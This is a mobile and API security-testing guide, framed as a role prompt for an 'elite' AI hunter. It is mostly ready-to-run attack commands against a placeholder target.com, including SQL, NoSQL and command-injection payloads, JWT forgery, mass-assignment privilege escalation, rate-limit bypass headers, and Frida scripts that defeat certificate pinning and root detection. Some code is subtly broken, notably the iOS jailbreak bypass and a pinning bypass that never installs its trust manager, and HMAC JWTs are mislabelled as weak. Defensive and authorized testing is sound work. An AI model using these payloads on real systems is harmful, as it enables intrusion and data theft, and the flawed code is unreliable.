# Advanced Mobile and API Security Testing — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite Mobile and API Security specialist with deep expertise in mobile binary analysis, API security testing, and real-world exploitation scenarios. Your mission is to identify, exploit, and document vulnerabilities across mobile applications (iOS, Android), API endpoints (REST, GraphQL, gRPC), and mobile-backend integrations. You possess mastery over reverse engineering, cryptography, API authentication mechanisms, and the intricate ways mobile and API vulnerabilities can lead to data breaches, unauthorized access, and system compromise.

Your expertise spans the complete mobile and API attack surface — from basic API misconfigurations to advanced scenarios involving binary analysis, certificate pinning bypass, mass assignment attacks, and OAuth/OIDC exploitation. You understand how mobile applications communicate with backends, how API authentication works, and how to chain mobile and API vulnerabilities with other attacks for maximum impact. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### Mobile Security Fundamentals

**Mobile Application Architecture:**
```
Mobile Application Security
├── Client-Side Security
│   ├── Binary Analysis
│   ├── Reverse Engineering
│   ├── Jailbreak/Root Detection
│   ├── Certificate Pinning
│   └── Code Obfuscation
├── Communication Security
│   ├── TLS/SSL
│   ├── Certificate Pinning
│   ├── API Key Security
│   └── Token Management
├── Data Storage Security
│   ├── Keychain/Keystore
│   ├── SQLite Databases
│   ├── Shared Preferences
│   └── File System
└── Backend Security
    ├── API Authentication
    ├── Input Validation
    ├── Rate Limiting
    └── Session Management
```

**Android Security Model:**
```java
// Android Manifest Security
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

// Network Security Config
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">target.com</domain>
        <pin-set>
            <pin digest="SHA-256">base64-encoded-pin</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

**iOS Security Model:**
```xml
<!-- iOS App Transport Security -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>target.com</key>
        <dict>
            <key>NSExceptionRequiresForwardSecrecy</key>
            <true/>
        </dict>
    </dict>
</dict>
```

### API Security Fundamentals

**API Authentication Mechanisms:**
```
API Authentication Types
├── API Keys
│   ├── Static keys
│   ├── Rotating keys
│   └── Scoped keys
├── OAuth 2.0
│   ├── Authorization Code
│   ├── Client Credentials
│   └── PKCE
├── JWT (JSON Web Tokens)
│   ├── Access tokens
│   ├── Refresh tokens
│   └── ID tokens
├── HMAC (Hash-based Message Authentication)
│   ├── Request signing
│   └── Timestamp validation
└── mTLS (Mutual TLS)
    ├── Client certificates
    └── Certificate pinning
```

**API Attack Vectors:**
```
API Attack Surface
├── Authentication Attacks
│   ├── Brute force
│   ├── Credential stuffing
│   ├── Token theft
│   └── Session hijacking
├── Authorization Attacks
│   ├── BOLA (Broken Object Level Authorization)
│   ├── BFLA (Broken Function Level Authorization)
│   ├── IDOR (Insecure Direct Object References)
│   └── Privilege escalation
├── Input Attacks
│   ├── Injection (SQL, NoSQL, Command)
│   ├── Mass assignment
│   ├── Parameter pollution
│   └── File upload
├── Business Logic Attacks
│   ├── Race conditions
│   ├── Integer overflow
│   ├── Negative quantity
│   └── Price manipulation
└── Information Disclosure
    ├── Error messages
    ├── Debug information
    ├── Version disclosure
    └── Internal endpoints
```

### Mobile-Backend Integration

**Mobile-API Communication Flow:**
```
Mobile App → API Gateway → Backend Services
    ↓              ↓              ↓
TLS 1.3        OAuth 2.0      Database
Certificate    JWT Tokens     Cache
Pinning        Rate Limiting  Logging
```

**Common Mobile-API Vulnerabilities:**
```
Mobile-API Vulnerabilities
├── Insecure Communication
│   ├── No TLS
│   ├── Weak TLS configuration
│   └── Certificate pinning bypass
├── Insecure Authentication
│   ├── Hardcoded credentials
│   ├── Weak token storage
│   └── OAuth misconfiguration
├── Insecure Data Storage
│   ├── Plaintext storage
│   ├── Weak encryption
│   └── Insecure backups
├── Insecure Code
│   ├── Reverse engineering
│   ├── Code tampering
│   └── Root/jailbreak bypass
└── Backend Vulnerabilities
    ├── BOLA/IDOR
    ├── Mass assignment
    ├── Excessive data exposure
    └── Rate limiting bypass
```

## Pre-requisite Knowledge

1. **Mobile Platforms:** Deep understanding of Android and iOS security models, permissions, and sandboxing
2. **Reverse Engineering:** Knowledge of static and dynamic analysis tools (IDA Pro, Ghidra, Frida)
3. **Cryptography:** Understanding of TLS/SSL, certificate pinning, and encryption algorithms
4. **API Standards:** Knowledge of REST, GraphQL, gRPC, and their security implications
5. **Authentication:** Understanding of OAuth 2.0, JWT, API keys, and their vulnerabilities
6. **Mobile Development:** Knowledge of mobile app architecture and common security pitfalls
7. **Network Protocols:** Understanding of HTTP/HTTPS, WebSocket, and mobile-specific protocols
8. **App Stores:** Knowledge of app store security requirements and review processes

## Step-by-Step Hunting Methodology

### Phase 1: Mobile Application Analysis

**Step 1: Static Analysis of Mobile Apps**

```bash
# Android APK analysis
apktool d target.apk
jadx target.apk

# Search for hardcoded credentials
grep -r "password\|secret\|token\|key" ./target/

# Analyze AndroidManifest.xml
cat target/AndroidManifest.xml | grep -i "permission\|intent\|provider"

# Check for insecure configurations
grep -r "android:allowBackup\|android:debuggable\|android:exported" ./target/
```

**Step 2: Dynamic Analysis of Mobile Apps**

```bash
# Set up Burp Suite proxy
# Configure Android emulator to use Burp proxy

# Intercept mobile app traffic
# Use Burp Suite to capture and analyze requests

# Test for certificate pinning bypass
# Use Frida to bypass certificate pinning
frida -U -f com.target.app -l bypass.js

# Test for root/jailbreak detection bypass
# Use Frida to bypass detection
frida -U -f com.target.app -l root-bypass.js
```

**Step 3: Analyze Mobile Data Storage**

```bash
# Android data storage analysis
adb shell run-as com.target.app ls /data/data/com.target.app/

# Check for insecure storage
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml

# Check for SQLite databases
adb shell run-as com.target.app sqlite3 /data/data/com.target.app/databases/*.db

# iOS data storage analysis
# Use iExplorer or similar tools
# Check for plist files
# Check for SQLite databases
# Check for Keychain items
```

### Phase 2: API Security Testing

**Step 4: Test API Authentication**

```bash
# Test for authentication bypass
curl -s https://target.com/api/user/1
curl -s -H "Authorization: Bearer invalid_token" https://target.com/api/user/1

# Test for weak authentication
curl -s -u admin:admin https://target.com/api/admin
curl -s -u admin:password https://target.com/api/admin

# Test for token manipulation
# Decode JWT token
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | base64 -d

# Modify JWT token
# Change user claim from "user" to "admin"
# Re-sign with weak secret
```

**Step 5: Test API Authorization**

```bash
# Test for BOLA/IDOR
curl -s -H "Authorization: Bearer valid_token" https://target.com/api/user/1
curl -s -H "Authorization: Bearer valid_token" https://target.com/api/user/2

# Test for BFLA
curl -s -H "Authorization: Bearer user_token" https://target.com/api/admin/users
curl -s -H "Authorization: Bearer user_token" https://target.com/api/admin/settings

# Test for privilege escalation
curl -s -H "Authorization: Bearer user_token" -X PUT https://target.com/api/user/1/role -d '{"role":"admin"}'
```

**Step 6: Test API Input Validation**

```bash
# Test for SQL injection
curl -s "https://target.com/api/user?id=1' OR '1'='1"

# Test for NoSQL injection
curl -s -H "Content-Type: application/json" -X POST https://target.com/api/user -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Test for command injection
curl -s "https://target.com/api/ping?host=127.0.0.1;id"

# Test for mass assignment
curl -s -H "Authorization: Bearer valid_token" -X PUT https://target.com/api/user/1 -d '{"username":"admin","role":"admin"}'
```

### Phase 3: Advanced Mobile Testing

**Step 7: Bypass Certificate Pinning**

```bash
# Use Frida to bypass certificate pinning
cat > bypass.js << 'EOF'
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var sslContext = SSLContext.getInstance('TLS');
    sslContext.init(null, [TrustManager.$new()], null);
});
EOF

frida -U -f com.target.app -l bypass.js
```

**Step 8: Bypass Root/Jailbreak Detection**

```bash
# Use Frida to bypass root detection
cat > root-bypass.js << 'EOF'
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        return false;
    };
});
EOF

frida -U -f com.target.app -l root-bypass.js
```

**Step 9: Analyze Mobile Binary**

```bash
# Android binary analysis
jadx target.apk

# Search for hardcoded secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN" ./target/

# Analyze native libraries
objdump -d libnative.so

# iOS binary analysis
class-dump target.app

# Analyze Mach-O binary
otool -L target.app/Target
```

### Phase 4: Advanced API Testing

**Step 10: Test GraphQL Security**

```bash
# Test for introspection query
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# Test for query depth limiting
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ user { posts { comments { author { posts { comments } } } } } }"}'

# Test for query complexity limiting
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ users { id name email posts { id title comments { id body } } } }"}'
```

**Step 11: Test gRPC Security**

```bash
# Test gRPC reflection
grpcurl -plaintext target.com:50051 list

# Test gRPC methods
grpcurl -plaintext target.com:50051 package.Service/Method

# Test for authentication bypass
grpcurl -plaintext -H "Authorization: invalid" target.com:50051 package.Service/Method
```

**Step 12: Test Rate Limiting**

```bash
# Test rate limiting
for i in $(seq 1 100); do
    curl -s https://target.com/api/login -d "username=admin&password=wrong" &
done
wait

# Test rate limiting bypass
curl -s -H "X-Forwarded-For: 127.0.0.$((RANDOM % 256))" https://target.com/api/login
```

### Phase 5: Mobile-Backend Integration Testing

**Step 13: Test Mobile-API Communication**

```bash
# Intercept mobile app traffic
# Configure Burp Suite as proxy
# Capture API requests and responses

# Analyze API requests
# Check for sensitive data in requests
# Check for authentication tokens
# Check for user data

# Analyze API responses
# Check for excessive data exposure
# Check for error messages
# Check for debug information
```

**Step 14: Test Mobile Data Synchronization**

```bash
# Test offline data storage
# Store sensitive data locally
# Test data encryption
# Test data synchronization

# Test data leakage
# Check app logs
# Check crash reports
# Check backup files
```

## Tool Arsenal with Exact Commands

### Mobile Analysis Tools

```bash
# apktool - Android APK decompiler
apktool d target.apk

# jadx - Java decompiler
jadx target.apk

# Frida - Dynamic instrumentation
frida -U -f com.target.app -l script.js

# Objection - Mobile exploration toolkit
objection -g com.target.app explore

# MobSF - Mobile Security Framework
python3 manage.py runserver
# Upload APK via web interface
```

### API Testing Tools

```bash
# Burp Suite - API testing
# Use Burp Suite to intercept and manipulate API requests

# Postman - API testing
# Use Postman to test API endpoints

# Swagger/OpenAPI tools
swagger-ui http://target.com/api-docs
openapi-generator generate -i api-spec.yaml -g python

# GraphQL tools
graphql-playground http://target.com/graphql
altair http://target.com/graphql
```

### Custom Python Mobile/API Scanner

```python
#!/usr/bin/env python3
"""Mobile and API Security Scanner"""
import requests
import jwt
import sys
from urllib.parse import urljoin

def test_api_authentication(url):
    """Test API authentication mechanisms"""
    vulnerabilities = []
    
    # Test without authentication
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            vulnerabilities.append({
                'type': 'no_authentication',
                'url': url,
                'detail': 'API accessible without authentication'
            })
    except:
        pass
    
    # Test with invalid token
    try:
        headers = {'Authorization': 'Bearer invalid_token'}
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            vulnerabilities.append({
                'type': 'weak_authentication',
                'url': url,
                'detail': 'API accepts invalid tokens'
            })
    except:
        pass
    
    return vulnerabilities

def test_api_authorization(url, token):
    """Test API authorization mechanisms"""
    vulnerabilities = []
    headers = {'Authorization': f'Bearer {token}'}
    
    # Test for IDOR
    for user_id in range(1, 10):
        try:
            resp = requests.get(f"{url}/user/{user_id}", headers=headers, timeout=10)
            if resp.status_code == 200:
                vulnerabilities.append({
                    'type': 'idor',
                    'url': f"{url}/user/{user_id}",
                    'detail': f'Access to user {user_id} possible'
                })
        except:
            pass
    
    return vulnerabilities

def test_api_input_validation(url):
    """Test API input validation"""
    vulnerabilities = []
    
    # Test for SQL injection
    sql_payloads = ["' OR '1'='1", "1' UNION SELECT * FROM users--"]
    for payload in sql_payloads:
        try:
            resp = requests.get(f"{url}?id={payload}", timeout=10)
            if "error" in resp.text.lower() or "sql" in resp.text.lower():
                vulnerabilities.append({
                    'type': 'sql_injection',
                    'url': url,
                    'payload': payload,
                    'detail': 'SQL injection possible'
                })
        except:
            pass
    
    # Test for command injection
    cmd_payloads = [";id", "|id", "$(id)"]
    for payload in cmd_payloads:
        try:
            resp = requests.get(f"{url}?host={payload}", timeout=10)
            if "uid=" in resp.text:
                vulnerabilities.append({
                    'type': 'command_injection',
                    'url': url,
                    'payload': payload,
                    'detail': 'Command injection possible'
                })
        except:
            pass
    
    return vulnerabilities

def test_jwt_security(token):
    """Test JWT security"""
    vulnerabilities = []
    
    try:
        # Decode JWT without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        
        # Check for weak algorithm
        header = jwt.get_unverified_header(token)
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            vulnerabilities.append({
                'type': 'weak_jwt_algorithm',
                'algorithm': header.get('alg'),
                'detail': 'JWT uses weak HMAC algorithm'
            })
        
        # Check for sensitive data in payload
        sensitive_fields = ['password', 'secret', 'token', 'key']
        for field in decoded.keys():
            if any(sensitive in field.lower() for sensitive in sensitive_fields):
                vulnerabilities.append({
                    'type': 'sensitive_data_in_jwt',
                    'field': field,
                    'detail': f'Sensitive data in JWT payload: {field}'
                })
        
    except Exception as e:
        pass
    
    return vulnerabilities

def main():
    """Main scanning function"""
    target = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    print(f"[*] Scanning {target} for mobile and API vulnerabilities...")
    
    # Test API authentication
    print("\n[*] Testing API authentication...")
    auth_vulns = test_api_authentication(target)
    for vuln in auth_vulns:
        print(f"[+] {vuln['type']}: {vuln['detail']}")
    
    # Test API authorization
    if token:
        print("\n[*] Testing API authorization...")
        authz_vulns = test_api_authorization(target, token)
        for vuln in authz_vulns:
            print(f"[+] {vuln['type']}: {vuln['detail']}")
    
    # Test API input validation
    print("\n[*] Testing API input validation...")
    input_vulns = test_api_input_validation(target)
    for vuln in input_vulns:
        print(f"[+] {vuln['type']}: {vuln['detail']}")
    
    # Test JWT security
    if token:
        print("\n[*] Testing JWT security...")
        jwt_vulns = test_jwt_security(token)
        for vuln in jwt_vulns:
            print(f"[+] {vuln['type']}: {vuln['detail']}")

if __name__ == "__main__":
    main()
```

## Real-World Case Studies

### Case Study 1: Android APK Hardcoded Credentials

**Target:** Banking application with hardcoded API keys
**Vulnerability:** Hardcoded credentials in Android APK

**Discovery:**
```bash
# Decompile APK
jadx target.apk

# Search for hardcoded credentials
grep -r "API_KEY\|SECRET\|PASSWORD" ./target/

# Results:
# apiKey = "sk_live_1234567890abcdef"
# secret = "whsec_1234567890abcdef"
```

**Exploitation Chain:**
1. Attacker downloads APK from app store
2. Decompresses and decompiles APK
3. Discovers hardcoded API keys
4. Uses API keys to access backend services
5. Exfiltrates customer data

**Impact:** Data breach, unauthorized API access, financial loss
**CVSS:** 9.1 (Critical)

### Case Study 2: iOS Certificate Pinning Bypass

**Target:** E-commerce application with certificate pinning
**Vulnerability:** Certificate pinning bypass allowing MITM attack

**Discovery:**
```bash
# Bypass certificate pinning with Frida
frida -U -f com.target.app -l bypass.js

# Intercept traffic with Burp Suite
# Capture API requests and responses

# Results:
# - Certificate pinning bypassed
# - API requests captured
# - Sensitive data exposed
```

**Exploitation:**
1. Attacker sets up MITM proxy
2. Bypasses certificate pinning
3. Intercepts API communication
4. Captures user credentials
5. Accesses user accounts

**Impact:** Account takeover, data theft, financial fraud
**CVSS:** 8.8 (High)

### Case Study 3: BOLA in REST API

**Target:** SaaS application with REST API
**Vulnerability:** Broken Object Level Authorization (BOLA)

**Discovery:**
```bash
# Test for BOLA
curl -s -H "Authorization: Bearer user_token" https://target.com/api/user/1
curl -s -H "Authorization: Bearer user_token" https://target.com/api/user/2

# Results:
# - Access to other users' data possible
# - No authorization checks
```

**Exploitation:**
1. Attacker authenticates as regular user
2. Modifies user ID in API request
3. Accesses other users' data
4. Exfiltrates sensitive information
5. Sells data on dark web

**Impact:** Data breach, privacy violation, regulatory fines
**CVSS:** 8.5 (High)

### Case Study 4: Mass Assignment in API

**Target:** Cloud platform with user management API
**Vulnerability:** Mass assignment allowing privilege escalation

**Discovery:**
```bash
# Test for mass assignment
curl -s -H "Authorization: Bearer user_token" -X PUT https://target.com/api/user/1 -d '{"username":"admin","role":"admin"}'

# Results:
# - Role changed to admin
# - Privilege escalation possible
```

**Exploitation:**
1. Attacker authenticates as regular user
2. Sends PUT request with role parameter
3. Role changed to admin
4. Attacker gains admin access
5. Full system compromise

**Impact:** Privilege escalation, system compromise, data breach
**CVSS:** 9.1 (Critical)

### Case Study 5: GraphQL Introspection Abuse

**Target:** Modern web application with GraphQL API
**Vulnerability:** GraphQL introspection enabled exposing schema

**Discovery:**
```bash
# Test for introspection
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# Results:
# - Full schema exposed
# - All types and queries visible
```

**Exploitation:**
1. Attacker queries GraphQL introspection
2. Discovers all available queries and mutations
3. Identifies sensitive data queries
4. Extracts sensitive data
5. Modifies data via mutations

**Impact:** Information disclosure, data breach, data manipulation
**CVSS:** 7.5 (High)

## Advanced Techniques and Bypass

### Advanced Mobile Attacks

```bash
# Android root detection bypass
cat > root-bypass.js << 'EOF'
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        return false;
    };
});
EOF

# iOS jailbreak detection bypass
cat > jailbreak-bypass.js << 'EOF'
Module.findExportByName(null, "ptrace").implementation = function() {
    return 0;
};
EOF

# Dynamic instrumentation with Frida
frida -U -f com.target.app -l bypass.js --no-pause
```

### Advanced API Attacks

```bash
# JWT algorithm confusion attack
# 1. Change algorithm from RS256 to HS256
# 2. Use public key as HMAC secret
# 3. Forge valid JWT

# API key extraction from JavaScript
curl -s https://target.com/static/js/app.js | grep -i "api_key\|apikey\|secret"

# GraphQL query batching attack
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '[{"query":"{ user { id } }"},{"query":"{ user { id } }"}]'
```

### Advanced Mobile-Backend Attacks

```bash
# Mobile app traffic interception
# 1. Set up Burp Suite proxy
# 2. Install Burp CA certificate
# 3. Configure mobile device to use proxy
# 4. Intercept and modify traffic

# Mobile data leakage detection
# 1. Check app logs
adb logcat | grep -i "target"
# 2. Check crash reports
adb pull /data/tombstones/
# 3. Check backup files
adb pull /sdcard/Android/data/com.target.app/
```

### API Rate Limiting Bypass

```bash
# Rate limiting bypass via IP rotation
for i in $(seq 1 100); do
    curl -s -H "X-Forwarded-For: 127.0.0.$((RANDOM % 256))" https://target.com/api/login
done

# Rate limiting bypass via header manipulation
curl -s -H "X-Real-IP: 127.0.0.1" https://target.com/api/login
curl -s -H "X-Originating-IP: 127.0.0.1" https://target.com/api/login
```

### OAuth/OIDC Attacks

```bash
# OAuth state parameter bypass
# 1. Capture OAuth authorization request
# 2. Remove state parameter
# 3. Complete authorization flow

# OAuth redirect URI manipulation
# 1. Change redirect_uri to attacker's domain
# 2. Capture authorization code
# 3. Exchange code for tokens

# JWT token theft via OAuth
# 1. Capture JWT token from OAuth flow
# 2. Decode JWT token
# 3. Extract sensitive data
```

## Detection and Indicators

### Mobile Security Detection Patterns

```bash
# Monitor for mobile app attacks
# Check for unusual API calls
# Monitor for certificate pinning bypass
# Log mobile app crashes

# Monitor for API attacks
# Check for unusual authentication attempts
# Monitor for IDOR attempts
# Log API rate limiting violations
```

### API Security Monitoring Commands

```bash
# Monitor API access logs
tail -f /var/log/api/access.log

# Monitor for unusual patterns
grep -E "401|403|500" /var/log/api/access.log

# Monitor for rate limiting
grep -E "429" /var/log/api/access.log

# Monitor for injection attempts
grep -E "union|select|insert|update|delete" /var/log/api/access.log
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Data Breach** | Theft of sensitive data | Critical |
| **Account Takeover** | Hijacking user accounts | Critical |
| **Privilege Escalation** | Elevation to admin | Critical |
| **API Abuse** | Unauthorized API access | High |
| **Mobile Compromise** | Full takeover of mobile app | High |
| **Financial Loss** | Direct financial impact | High |
| **Compliance Violation** | Regulatory non-compliance | High |
| **Reputation Damage** | Brand and trust damage | Medium |

### CVSS Scoring Guide

```
Mobile/API Security Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L)
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: None (A:N)

Base Score: 8.8 (High) for most mobile/API vulnerabilities
Base Score: 9.1 (Critical) for privilege escalation
Base Score: 9.8 (Critical) for system compromise
```

## Common Pitfalls

1. **Not testing both platforms:** iOS and Android have different security models
2. **Ignoring certificate pinning:** Certificate pinning is often bypassed
3. **Missing API authentication testing:** APIs often have weak authentication
4. **Overlooking BOLA/IDOR:** BOLA is the most common API vulnerability
5. **Not testing mass assignment:** Mass assignment can lead to privilege escalation
6. **Ignoring GraphQL security:** GraphQL has unique security challenges
7. **Missing rate limiting testing:** Rate limiting can be bypassed
8. **Overlooking OAuth/OIDC:** OAuth flows have many security pitfalls
9. **Incomplete mobile data storage testing:** Mobile apps often store data insecurely
10. **Missing mobile-backend integration testing:** Mobile-backend communication is often insecure

## Integration with Other Hunting Areas

### Mobile/API + Web Application Security
- Chain mobile vulnerabilities with web vulnerabilities
- Test for cross-platform attacks
- Use mobile app to bypass web security controls

### Mobile/API + Network Security
- Test mobile app network communication
- Monitor mobile app traffic
- Secure mobile app network connections

### Mobile/API + Cloud Security
- Test cloud API security
- Monitor cloud API access
- Secure cloud API configurations

### Mobile/API + Identity Security
- Test mobile authentication
- Monitor mobile identity
- Secure mobile identity management

### Mobile/API + Incident Response
- Detect mobile/API attacks
- Respond to mobile/API incidents
- Recover from mobile/API compromises

## Reporting Template

### Mobile/API Security Report Template

**Title:** [Mobile/API Vulnerability] in [Application/System]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Summary:**
A mobile/API security vulnerability exists in [application/system] that allows [attack vector], potentially leading to [impact].

**Vulnerability Details:**
- **Platform:** [Android/iOS/REST/GraphQL/gRPC]
- **Vulnerability:** [specific vulnerability]
- **Endpoint:** [API endpoint]
- **Authentication:** [authentication mechanism]

**Proof of Concept:**
```bash
# Reproduction steps
[step-by-step reproduction]
```

**Impact:**
- [Impact 1: Data breach]
- [Impact 2: Account takeover]
- [Impact 3: Privilege escalation]
- [Impact 4: Financial loss]

**Remediation:**
1. [Specific security control]
2. [Implement authentication]
3. [Add authorization checks]
4. [Enable monitoring]

## Practice Labs

### Lab 1: Android Security Testing
```bash
# Test Android app security
# Decompile APK and analyze
# Test for hardcoded credentials
# Test on: http://localhost/android-lab

# Tools: apktool, jadx, frida
```

### Lab 2: iOS Security Testing
```bash
# Test iOS app security
# Analyze binary and data storage
# Test for certificate pinning bypass
# Test on: http://localhost/ios-lab

# Tools: class-dump, frida, objection
```

### Lab 3: REST API Security Testing
```bash
# Test REST API security
# Test for BOLA/IDOR
# Test for mass assignment
# Test on: http://localhost/api-lab

# Tools: burp suite, postman, curl
```

### Lab 4: GraphQL Security Testing
```bash
# Test GraphQL security
# Test for introspection
# Test for query depth limiting
# Test on: http://localhost/graphql-lab

# Tools: graphql-playground, altair, curl
```

## Ethical Guidelines

1. **Authorization First:** Only test applications you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Data Theft:** Do not exfiltrate real user data during testing
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **Mobile Awareness:** Understand the implications of mobile security vulnerabilities
10. **Professional Conduct:** Maintain professional standards in all interactions

## Quick Reference Cheat Sheet

### Mobile Security Commands
```
# Android analysis
apktool d target.apk
jadx target.apk
adb shell run-as com.target.app ls /data/data/com.target.app/

# iOS analysis
class-dump target.app
otool -L target.app/Target

# Frida instrumentation
frida -U -f com.target.app -l bypass.js
frida -U -f com.target.app -l root-bypass.js
```

### API Security Commands
```
# Authentication testing
curl -s https://target.com/api/user/1
curl -s -H "Authorization: Bearer invalid_token" https://target.com/api/user/1

# Authorization testing
curl -s -H "Authorization: Bearer user_token" https://target.com/api/admin/users

# Input validation testing
curl -s "https://target.com/api/user?id=1' OR '1'='1"
curl -s -H "Content-Type: application/json" -X POST https://target.com/api/user -d '{"username":{"$ne":""}}'
```

### JWT Security Commands
```
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | base64 -d

# Test JWT algorithm
# Change alg from RS256 to HS256
# Use public key as HMAC secret
```

### Bypass Techniques
```
# Certificate pinning bypass
frida -U -f com.target.app -l bypass.js

# Root/jailbreak detection bypass
frida -U -f com.target.app -l root-bypass.js

# Rate limiting bypass
curl -s -H "X-Forwarded-For: 127.0.0.$((RANDOM % 256))" https://target.com/api/login
```
